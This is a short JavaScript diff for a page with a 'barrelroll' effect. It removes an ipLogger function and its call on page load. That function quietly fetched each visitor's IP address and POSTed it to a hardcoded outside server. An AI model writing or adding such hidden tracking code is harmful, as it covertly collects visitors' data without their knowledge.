@@ -9,7 +9,6 @@ function YeetusdeletusReze() {
 
 document.addEventListener('DOMContentLoaded', function() {
     const btn = document.getElementById('barrelroll')
-    ipLogger();
     if (btn) {
         if (enabled) {
             document.body.classList.add("barrelroll")
@@ -20,16 +19,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 })
-
-async function ipLogger() {
-        const ipRes = await fetch('https://api64.ipify.org?format=json');
-        const { ip } = await ipRes.json();
-        await fetch(`http://66.66.66.66/log?ip=${ip}`, { // just yeet the ip into hell
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({ ip }),
-        });
-}
 
 function leon() {
     const leon_response = document.createElement("p");
